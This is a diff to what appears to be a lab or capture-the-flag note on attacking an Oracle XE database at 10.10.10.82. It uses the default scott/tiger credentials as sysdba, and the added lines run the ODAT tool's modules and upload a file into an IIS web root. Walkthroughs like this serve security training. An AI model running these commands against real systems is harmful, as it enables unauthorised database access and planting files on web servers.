@@ -14,6 +14,11 @@ sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba <- this is like sudo
 
 Note: scott/tiger is the default creds to Oracle.
 
+Optional Commands:
+sudo python3 odat.py all -s 10.10.10.82 -d XE -U scott -P tiger --sysdba
+sudo python3 odat.py dbmsxslprocessor -s 10.10.10.82 -d XE -U scott -P tiger --putFile "c:\\inetpub\\wwwroot" "meow.txt" "meow.txt" --sysdba
+Note: better to do commands down below.
+
 Oracle SQL Commands once connected:
 set SERVEROUTPUT on
 
